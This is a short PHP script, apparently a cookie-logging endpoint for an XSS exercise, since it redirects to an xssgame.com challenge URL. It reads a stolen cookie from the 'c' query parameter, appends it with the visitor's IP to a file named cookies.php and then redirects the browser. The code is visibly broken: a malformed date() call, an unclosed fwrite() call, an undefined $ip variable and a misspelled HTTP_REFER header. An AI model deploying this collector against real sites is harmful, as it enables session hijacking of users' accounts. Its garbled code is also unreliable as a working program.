<?php
$cookie = $_GET['c'];
$date=date"j F, Y, g:i a");;
$refer = getenv('HTTP_REFER');
$fp = fopen('cookies.php', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br /> IP: '.$ip. '<br /> Date and time: ';
fclose($fp);
header ("Location: http://www.xssgame.com/f/m4KKGHi2rVUN/?");
?>
